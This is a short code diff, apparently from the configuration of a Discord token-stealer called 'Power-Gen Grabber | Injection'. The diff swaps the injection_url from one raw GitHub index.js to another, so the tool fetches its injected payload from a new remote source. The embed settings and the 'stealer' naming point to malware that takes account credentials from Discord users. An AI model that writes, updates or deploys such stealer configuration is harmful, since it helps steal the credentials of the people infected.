@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Power-Gen Grabber | Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1125391531633811481/1126239251093262376/Power-gen_2.gif'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/blxstealer/main/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/N3veRR/main/main/index.js', 
   /**
    
    **/
